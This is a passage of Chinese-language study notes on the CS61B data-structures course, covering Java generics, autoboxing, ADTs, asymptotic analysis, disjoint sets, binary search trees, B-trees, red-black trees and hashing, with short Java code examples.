class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h3 id="3-6-JAR-FILE-gitbook"><a href="#3-6-JAR-FILE-gitbook" class="headerlink" title="3. 6 JAR FILE(gitbook)"></a>3. 6 JAR FILE(gitbook)</h3><ol><li>程序将包含多个 .class 文件。如果您想共享此程序，而不是共享特殊目录中的所有 .class 文件，您可以通过创建 JAR 文件将所有文件“压缩”在一起。这个单.jar文件将包含您的所有 .class 文件，以及<strong>其他一些附加信息</strong></li><li>JAR 文件就像 zip 文件一样。完全可以将文件解压缩并转换回.java文件。JAR 文件不能保证您的代码安全，因此您不应与其他学生共享您的项目.jar文件</li></ol><h3 id="3-7-Access-Control-gitbook"><a href="#3-7-Access-Control-gitbook" class="headerlink" title="3. 7 Access Control(gitbook)"></a>3. 7 Access Control(gitbook)</h3><ol><li>Package Private：Java中，如果一个类的成员（如变量、方法）没有显式地声明为 public、protected 或 private，那么这个成员将默认拥有包私有（Package-Private）访问权限。包私有的意思是：<ol><li>同一包内的类 可以访问这些成员。</li><li>包外的类 不能访问这些成员，即使它们是该类的子类</li></ol></li><li>Interface Public：对于接口，其方法的默认访问实际上是 public，且访问仅取决于静态类型(不考虑动态类型)</li><li>针对java的member<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/access_modifiers.png" alt="java访问控制"></li></ol></li></ol><h3 id="3-8-Generic-and-AutoBoxing-gitbook"><a href="#3-8-Generic-and-AutoBoxing-gitbook" class="headerlink" title="3. 8 Generic and AutoBoxing(gitbook)"></a>3. 8 Generic and AutoBoxing(gitbook)</h3><ol><li><p>autoboxing</p><ol><li>Java 可以在原始类型(8种)和包装器类型之间隐式转换</li><li>Notice<ol><li>Arrays are never autoboxes or auto-unboxed：int[] x地址与integer[] y地址不可以赋值</li><li>依赖于自动装箱和取消装箱的代码将比避免此类自动转换的代码慢</li><li>包装类型比基元类型使用更多的内存：不仅您的代码必须包含对对象的 64 位引用，而且每个对象还需要 64 位开销用于存储对象的动态类型等内容</li></ol></li><li>automatically widen a primitive<ol><li>小转大会自动转(double d)传入int i等效于(double) i</li><li>较宽的类型转到较窄的类型，则必须手动强制转换</li></ol></li></ol></li><li><p>auto boxing 导致的错误</p><ol><li><p>Problem</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123; </span><br><span class="line">   ArrayMap&lt;Integer, Integer&gt; am = <span class="keyword">new</span> <span class="title class_">ArrayMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">   am.put(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">   <span class="type">int</span> <span class="variable">expected</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">   assertEquals(expected, am.get(<span class="number">2</span>)); <span class="comment">// 这一行会错误</span></span><br><span class="line">   <span class="comment">// solution</span></span><br><span class="line">   <span class="comment">// assertEquals(expected, (int) am.get(2));</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* REASON</span></span><br><span class="line"><span class="comment">    * assertEquals(int expected, int actual)</span></span><br><span class="line"><span class="comment">    * assertEquals(Object expected, Object actual)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>generic methods</p><ol><li>与泛型类区别<ol><li>泛型类：在类级别定义类型参数，这些类型参数在整个类的范围内都可以使用。</li><li>泛型方法：在方法级别定义类型参数，这些类型参数仅在方法的范围内有效</li></ol></li><li>Grammar<code>public static &lt;T&gt; T get(List&lt;T&gt; lst);</code>&lt;T&gt;用于指定类型参数</li></ol></li><li><p>Type Upper Bounds</p><ol><li>Problem：在4. 1中maxKey(OurMap&lt;K,V&gt; map)中进行比较的Problem：并非所有对象都有CompareTo和&gt;&lt;</li><li>类型上界（Type Upper Bounds）是Java泛型中的一种机制，允许你在泛型类型参数中指定类型的上限。这意味着你可以限制泛型类型参数所能接受的类型，确保泛型方法或类只适用于某些特定的类型或其子类型</li><li>Grammar<ol><li><code>public &lt;T extends SuperClass&gt; void someMethod(T param)</code></li><li><code>public static &lt;K extends Comparable&lt;K&gt;, V&gt; K maxKey(Map61B&lt;K, V&gt; map) &#123;...&#125;</code></li><li>可以是接口(也是extends不是implements)&#x2F;类——当与泛型一起使用时（如在泛型方法头中），extends 会施加约束，而不是授予新的能力</li></ol></li></ol></li></ol><h2 id="4-Abstraction-ADTs-and-Asymtotics-Annlysis"><a href="#4-Abstraction-ADTs-and-Asymtotics-Annlysis" class="headerlink" title="4. Abstraction, ADTs and Asymtotics Annlysis"></a>4. Abstraction, ADTs and Asymtotics Annlysis</h2><h3 id="4-1-OurMap-gitbook"><a href="#4-1-OurMap-gitbook" class="headerlink" title="4. 1 OurMap(gitbook)"></a>4. 1 OurMap(gitbook)</h3><ol><li>这个是5. 3的，很奇怪这里是叫我们实现自己的map(simple)<ol><li>代码详见Map61b</li></ol></li><li>auto boxing导致的问题见3. 8</li></ol><h3 id="4-2-Encapsulation-API’s-ADT’s"><a href="#4-2-Encapsulation-API’s-ADT’s" class="headerlink" title="4. 2 Encapsulation, API’s, ADT’s"></a>4. 2 Encapsulation, API’s, ADT’s</h3><ol><li><p><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/collection_hierarchy.png" alt="collection"></p></li><li><p>Encapsulate 封装</p><ol><li>Module模块：一组方法，它们作为一个整体协同工作，以执行某些任务或一组相关任务</li><li>封装：如果模块的实现是完全隐藏的，则称其为封装模块，并且只能通过记录的接口访问它</li></ol></li><li><p>API（应用程序编程接口）</p></li><li><p>ADT（抽象数据结构）是由其行为定义的高级类型，而不是由其实现定义的高级类型——可以从接口来看</p><ol><li><p>在 Java 中，Deque 被称为接口。从概念上讲，我们将 deque 称为 Abstract 数据类型。Deque 只带有行为，而没有任何具体的方式来展示这些行为。这样，它就是抽象的</p></li><li><p><em><strong>使用已有实现DS构造ADT</strong></em>：List&lt;T&gt;做出Stack</p><ol><li>委托和继承一般可以互换：委托是指您不想将当前类视为您从中提取方法的类的一个版本——is-a，has-a</li><li>Adapter明显使用依赖注入的方式，自定义程度较高</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 1. Extends 继承 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyStack</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;T&gt; &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> &#123;</span><br><span class="line">      add(x);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 2. Delegation: has-a list */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyStack</span>&lt;T&gt; &#123;</span><br><span class="line">   <span class="keyword">private</span> List&lt;T&gt; lst = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;T&gt;();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span>&#123;</span><br><span class="line">      lst.add(t);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 3. Adapter: Seperate inject */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyStack</span>&lt;T&gt; &#123;</span><br><span class="line">   <span class="keyword">private</span> List lst;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">StackAdapter</span><span class="params">(List&lt;T&gt; worker)</span> &#123;</span><br><span class="line">      lst = worker;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> &#123;</span><br><span class="line">      lst.add(t);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一些常用的adts</p><ol><li>堆栈：支持元素后进先出检索的结构</li><li>列表：一组有序的元素</li><li>Sets ：一组无序的唯一元素（无重复）</li><li>映射：键&#x2F;值对集</li></ol></li></ol></li><li><p>View</p><ol><li><p>作用：视图（Views）是对现有对象的一种替代表示。视图本质上限制了用户对底层对象的访问权限。通过视图进行的修改会影响到实际的底层对象</p></li><li><p>例子：List&lt;String&gt;子类的subList()返回的SubList&lt;T&gt;是原列表的一个视图，包含了对源列表的引用，并使用“指针”进行标记</p><ol><li>举的例子是进行反转</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Item&gt; <span class="title function_">sublist</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span>&#123;</span><br><span class="line">   Return <span class="keyword">new</span> <span class="title class_">this</span>.Sublist(start,end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Private <span class="keyword">class</span> <span class="title class_">Sublist</span> <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;Item&gt;&#123;</span><br><span class="line">    Private <span class="type">int</span> start end;</span><br><span class="line">    Sublist(inst start, <span class="type">int</span> end)&#123;...&#125;</span><br><span class="line">    <span class="comment">// 需要指向同一个列表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>View与API进行结合——通用的反转方法，通过使用subList()方法使得反转API连贯</p></li></ol></li></ol><h3 id="4-3-Asymptotics-I-II"><a href="#4-3-Asymptotics-I-II" class="headerlink" title="4. 3 Asymptotics I II"></a>4. 3 Asymptotics I II</h3><ol><li>比较算法效率，Math Methods<ol><li>The key<ol><li>Abstraction: dropping lower order terms and multiplicative constants</li><li>only care about the order of growth of R(N) -&gt; f(N)</li></ol></li><li>Trick and Principles<ol><li>ONE: Consider only the Worst Case -&gt; N approaches infinity</li><li>TWO: Restrict Attention to One Operation -&gt; Eliminate Low Order Terms</li><li>THREE: Eliminate Multiplicative Constants</li></ol></li></ol></li><li>arbitrary units of time(AU): 任意时间单位</li><li>Big-Theta: Fixing Uncertainty with Boundaries<ol><li>K1*f(n) &lt; R(N) &lt; K2*f(n) 给定K1、K2，在一定范围内成立，同理，可以调整K1、K2来调整范围</li><li>也可以理解为“夹逼”</li><li>Describing runtime with both an upper and lower bound can informally be though of as runtime “equality”.</li></ol></li><li>Big-O: less than or equal, upper bounded<ol><li>Big-O don’t care the lower bound</li><li>R(N) &lt;&#x3D; K2*f(n)</li></ol></li><li>让分析更快、更准<ol><li>计算操作数量，可用~来表示大致</li><li><strong>集合图形法</strong>：几次循环用几维，面积图形</li><li><strong>C(n)-n</strong>：图可以看出<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Comlicated_Counting.jpg" alt="cs61b中的题"></li></ol></li><li><strong>增量方法</strong>：将 1 添加到 N 时，我们需要完成的工作量就会增加一倍，则是2^n</li><li>记住一些常用的<ol><li>上面图就是一个例子，思想可以利用到摊销那里(折线化直)</li><li>递归recursion<ol><li>特点：树状，2^n:将 1 添加到 N 时，我们需要完成的工作量就会增加一倍</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/asymptotics2_tree2.png" alt="recursion"></li><li>Math Way: C(1) &#x3D; 1, C(2) &#x3D; 1 + 2*C(1), C(3) &#x3D; 1 + 2*C(2), C(N) &#x3D; 1 + 2*C(n-1)——其中的root是1</li></ol></li><li>binary search<ol><li>特点：树状</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/static_binary_search.png" alt="static"></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/bs_total.jpg" alt="total"> fix: not array sorting but find one in the array</li></ol></li><li>merge sort: sort using 二分法<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/ms_total.jpg" alt="total"></li></ol></li></ol></li></ol></li></ol><h3 id="4-4-Omega-and-Amortized-Analysis-gitbook"><a href="#4-4-Omega-and-Amortized-Analysis-gitbook" class="headerlink" title="4. 4 Omega and Amortized Analysis(gitbook)"></a>4. 4 Omega and Amortized Analysis(gitbook)</h3><ol><li>Big Theta limitation:  if the runtime depends on more than just the size of the input, then we must qualify our statements into different cases before using Big Theta – use Big O<ol><li>酒店最贵的房间是每晚639美元 – Big Theta</li><li>酒店每间客房每晚低于或等于 639 美元 – Big O<ol><li>Big O is NOT the same as “worst case”. But it is often used as such, it only means upper bound</li></ol></li></ol></li><li>When or Why we use Big-O<ol><li>It allows us to make simple statements without case qualifications, in cases where the runtime is different for different inputs.</li><li>Sometimes, for particularly tricky problems, we (the computer science community) don’t know the exact runtime, so we may only state an upper bound.</li><li>It’s a lot easier to write proofs for Big O than Big Theta, like we saw in finding the runtime of mergesort in the previous chapter. This is beyond the scope of this course.</li></ol></li><li>Big-Omega<ol><li>“greater than or equal”</li><li>作用<ol><li>prove Big-Theta: 夹逼证两端</li><li>It’s used to prove the difficulty of a problem. For example, ANY duplicate-finding algorithm must be Ω(N), because the algorithm must at least look at each element.</li></ol></li></ol></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Big_Three.png" alt="Big-Three"></li><li>Amortization!!! <img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Amortization.jpg" alt="摊销的势能证明"></li></ol><h3 id="4-5-Disjoint-Sets-不相交集"><a href="#4-5-Disjoint-Sets-不相交集" class="headerlink" title="4. 5 Disjoint Sets(不相交集)"></a>4. 5 Disjoint Sets(不相交集)</h3><ol><li><p><em><strong>Introduction</strong></em></p><ol><li><p>the Disjoint Set Interface</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Interface DisjointSet &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>;</span><br><span class="line">   <span class="type">boolean</span> <span class="title function_">isConnected</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>三种比较</p><ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/DS_Compare.png" alt="pic"></li></ol></li></ol></li><li><p><em><strong>Quick Find</strong></em></p><ol><li><p>Quick Find:使用整形数组下标作为对应的值，对应下标的值是分组编号</p></li><li><p>connect O(n)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>&#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> id[p];</span><br><span class="line">   <span class="type">int</span> <span class="variable">qid</span> <span class="operator">=</span> id[q];</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; id.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (id[i] == pid)&#123;</span><br><span class="line">          id[i] = qid;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p><em><strong>Quick Union</strong></em></p><ol><li><p>仍然是整形数组下标作为对应的值如1，2，3；_arr[index]则是对应的parent父索引（使用index即值），形成树的结构；-1表示一个集合的根</p></li><li><p>implement</p><ol><li><p>connect-&gt;一个的根认另一个为根</p></li><li><p>isConnected-&gt;是否具有相同根，即到-1时的index是否为同一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickUnionDS</span> <span class="keyword">implements</span> <span class="title class_">DisjointSets</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span>[] parent;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">QuickUnionDS</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">      parent = <span class="keyword">new</span> <span class="title class_">int</span>[num];</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">          parent[i] = i; <span class="comment">// 初始时都是分开的</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> p)</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (parent[p] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">          p = parent[p]; <span class="comment">// 直接找到根部，直到值&lt;0则ok</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> find(p);</span><br><span class="line">      <span class="type">int</span> j= find(q);</span><br><span class="line">      parent[i] = j;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isConnected</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Tips</p><ol><li>潜在问题：树变得很长-&gt;通过高度&#x2F;weight解决（见4）</li><li>从运行时图表来看，QuickUnion 似乎比 QuickFind 差！但请注意 O(N) 作为上限。当我们的树平衡时， connect和isConnected都表现得相当好</li></ol></li></ol></li><li><p><em><strong>Weighted Quick Union(WQU) – LAB6 will implement</strong></em></p><ol><li>New rule: whenever we call connect, we always link the root of the smaller tree to the larger tree.新规则：每当我们调用connect时，我们总是将较小树的根链接到较大树。</li><li>smaller<ol><li>weight is smaller, weight means the number of items, proved better -&gt; rule: smallest weight to the largest weight</li><li>height is smaller</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/WeightedQU.png" alt="Pic"></li></ol></li><li>with weighted -&gt; O(logn) for connect and isConnected<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/WeightQU_example.png" alt="exmaple"></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Prove_WQU.jpg" alt="simple proof"></li></ol></li><li>Why not heighted? -&gt; 您可能想知道为什么我们不根据高度而不是重量来链接树木。事实证明，这实现起来更复杂，并且给了我们相同的 θ(log N) 高度限制(实现复杂，性能不改)</li></ol></li><li><p><em><strong>Weighted Quick Union with Path Compression</strong></em></p><ol><li>问题与思路：每当我们调用find(x)时，我们都必须遍历从x到 root 的路径。因此，在此过程中，我们可以将我们访问的所有项目连接到它们的根，而无需额外的渐近成本</li><li>Amortized:通过扩展，从长远来看， connect和isConnected的平均运行时间几乎变得恒定O(1)！这称为摊销运行时间</li><li>Extension:<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/DS_compareE.png" alt="extension"><ol><li>不是算法分析无需解决这个问题，只需要直到是O(1)即可</li></ol></li></ol></li></ol><h2 id="5-Trees-and-Hashing"><a href="#5-Trees-and-Hashing" class="headerlink" title="5. Trees and Hashing"></a>5. Trees and Hashing</h2><h3 id="5-1-Binary-Search-Tree-二叉搜索树"><a href="#5-1-Binary-Search-Tree-二叉搜索树" class="headerlink" title="5. 1 Binary Search Tree(二叉搜索树)"></a>5. 1 Binary Search Tree(二叉搜索树)</h3><ol><li><p>是TreeSet和TreeMap的底层实现，BST和在BST基础上实现的结构都不能有重复duplicate</p></li><li><p>List</p><ol><li>Skip List(not in cs61b), expected O(logn)</li><li>BST, expected O(logn)</li></ol></li><li><p>树的定义都知道，那记一记BST的特性</p><ol><li>二叉</li><li>大小限定–&gt;可以将三角形投影成线来可视化大小在数轴上</li></ol></li><li><p>搜索操作 O(logn)</p><ol><li><p>此处为裸实现，再次实现需要包装，使用递归(不要进行arms length base cases)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归写法</span></span><br><span class="line"><span class="keyword">static</span> BST <span class="title function_">find</span><span class="params">(BST T, Key sk)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (T == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">if</span> (sk.equals(T.key))</span><br><span class="line">      <span class="keyword">return</span> T;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sk ≺ T.key)</span><br><span class="line">      <span class="keyword">return</span> find(T.left, sk);</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> find(T.right, sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>插入操作 O(logn)</p><ol><li><p>注意：总是在叶节点进行插入，一直找知道找到叶子</p></li><li><p>以下的BST是树与根节点的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> BST <span class="title function_">insert</span><span class="params">(BST T, Key ik)</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (T == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BST</span>(ik);</span><br><span class="line">   &#125; <span class="comment">// 叶节点的递归情况</span></span><br><span class="line">   <span class="keyword">if</span> (ik &lt; T.key) &#123;</span><br><span class="line">      T.left = insert(T.left,ik);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ik &gt; T.key) &#123;</span><br><span class="line">      T.right = insert(T.right,ik);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> T;</span><br><span class="line">   <span class="comment">// 树中的递归情况，包括找到相等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>删除 O(logn), 有三种情况</p><ol><li>没有孩子-&gt;直接删</li><li>有一个孩子-&gt;父节点指针指向子节点， 使得本来没有被指向了，直接被垃圾回收</li><li>有两个孩子-&gt;选新新节点来代替 Hibbard删除<ol><li>新节点必须：比左子树中的所有内容都 &gt; 或者是&lt;比一切右子树</li><li>简单：左再最大(presuccessor)，或者右再最小(successor)</li></ol></li></ol></li><li><p>可以作为集合与映射(同时加上值即可)</p></li></ol><h3 id="5-2-B-Tree-Maybe-Boeing-Tree"><a href="#5-2-B-Tree-Maybe-Boeing-Tree" class="headerlink" title="5. 2 B-Tree (Maybe Boeing Tree)"></a>5. 2 B-Tree (Maybe Boeing Tree)</h3><ol><li><a href="https://www.cs.usfca.edu/~galles/visualization/BTree.html">B-Tree Visualization</a></li><li>描述性能<ol><li>深度depth: 连接数量</li><li>高度height: 树的最低深度，树的高度决定了最坏情况下的运行时间</li><li>平均深度average depth: 就像求均值一样，平均深度决定平均情况运行时间</li></ol></li><li>BST问题与改进<ol><li>BST最坏的插入顺序下会是theta(n)，变成一个链表，这很不好，方法–B-Tree</li><li>什么是最坏情况<ol><li>经过27页的论文证明，真正随机地插入数据，它实际上会变得相对茂密—-平均深度和高度预计为theta(logn)</li><li>但是我们并不总是能够以随机顺序插入 BST，不如按照时间进行排列</li></ol></li><li><em><strong>何谓BST平衡Banlanced</strong></em><ol><li>左右两半一样</li><li>每加一层&#x3D;&#x3D;加上面全部&#x3D;&#x3D;数量翻倍</li></ol></li></ol></li><li>B-Tree<ol><li>从一个crazy idea开始: 不要添加叶节点！当我们插入时，我们只添加到当前的叶节点，增加宽度<ol><li>Problem1: 还是O(N)，数量一多就麻烦了</li><li>Solution1: 对单个节点中的元素数量设置限制，L &#x3D; constant value使得O(1)，此处的思维涉及数据结构的本质(0. 8)</li><li>Problem2: 超出了如何解决</li><li>Solution2: 无论是根&#x2F;叶&#x2F;树种，我们将把该节点分成两半。通过向上移动中间左侧的节点，并将被拆分节点左侧的值连接到父节点上<ol><li>如果是中间节点，上移时要分配下游节点</li></ol></li></ol></li><li>专有名词<ol><li>2-3 Tree: L &#x3D; 2</li><li>2-4 或者 2-3-4 Tree: L &#x3D; 3</li><li>变形过程: split</li></ol></li><li>Insert和Delete详见<ol><li><a href="https://joshhug.gitbooks.io/hug61b/content/chap11/chap112.html">gitbook</a>中的slide</li><li><a href="https://joshhug.gitbooks.io/hug61b/content/chap11/chap113.html">deletion slide</a></li></ol></li><li><strong>Invariant不变量</strong>–导致树时浓密的<ol><li>所有叶子与源的距离必须相同</li><li>一个非叶节点k必须完全k+1个孩子</li></ol></li><li><strong>RunTime Effiency</strong><ol><li><del>log下标L+1 (N) 最佳(每个节点都是L-1满了时)和</del>log下标L (N) 最差</li><li>所得的树具有完美的平衡。操作的运行时间是 O(logN)</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/RunTime_B_Tree.png" alt="runtime"></li></ol></li></ol></li></ol><h3 id="5-3-Black-Red-Tree-红黑树"><a href="#5-3-Black-Red-Tree-红黑树" class="headerlink" title="5. 3 Black-Red-Tree (红黑树)"></a>5. 3 Black-Red-Tree (红黑树)</h3><ol><li>Why? Ans:B-Tree implementation too painful and unclearly<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Why_BRT.png" alt="B-Tree implementation too painful and unclearly"></li></ol></li><li>rotate<ol><li>不能右:向右要有左</li><li>思路:数轴映射大小去理解</li><li>没有算法可以直接算出要怎么得出所有路径，但是可以在一定步数内达到</li></ol></li><li>LLRB-BST<ol><li>判断是否可行：两个Invariant</li><li>通过2-3Tree判断高度：red+black，&lt;2* height of the 2-3 tree</li></ol></li></ol><h3 id="5-4-Hashing"><a href="#5-4-Hashing" class="headerlink" title="5. 4 Hashing"></a>5. 4 Hashing</h3><ol><li>way to construct set and map<ol><li>Linked Structure: Skip Link</li><li>Self-Balance Structure: llrb, b-tree</li><li>random: hashing<ol><li>相比于树在set和map的优势 – 不用每个item都可以比较</li><li>In Java, implemented as java.util.HashMap and java.util.HashSet.</li></ol></li></ol></li><li>Introduction to Hash<ol><li>使用数据作为索引<ol><li>Problem1: how to deal with diffierent data to avoid collision?</li><li>Solution1: 如对于小写字母(26)个，”cat”&#x3D;&#x3D;3*27^2+3*27^1+2*27^0，可以使得26个组合错开，从而推广到其他如ascii</li></ol></li></ol></li><li>Dive into hashing<ol><li>Problem1: Integer Overflow(整数溢出了)<ol><li>Ans: 选取不太大的base如31</li></ol></li><li>HashCode:a hash code “projects a value from a set with many (or even an <strong>infinite number</strong> of) members to a value from a set with a <strong>fixed number</strong> of (fewer) members.” – 缩小空间</li><li>Problem2: How do we <strong>resolve hashCode collisions</strong>?<ol><li>use bucket is one way</li></ol></li><li>Problem3: How do we <strong>compute a hash code</strong> for 